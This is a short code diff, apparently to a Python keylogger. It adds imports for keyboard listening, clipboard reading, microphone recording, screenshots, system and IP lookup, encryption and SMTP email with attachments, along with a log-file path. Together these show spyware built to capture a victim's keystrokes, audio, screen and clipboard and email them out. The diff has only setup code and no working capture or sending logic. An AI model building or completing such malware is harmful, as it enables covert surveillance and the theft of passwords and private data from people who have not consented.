@@ -1,5 +1,32 @@
-import os
+# libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket, platform
+
+import win32clipboard
+
 from pynput.keyboard import Key, Listener
+
+import time, os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+script_directory = os.path.dirname(os.path.abspath(__file__))
+log_file_path = os.path.join(script_directory, "log.txt")
 
 BUFFER_COUNT = 30
 buffer = ""
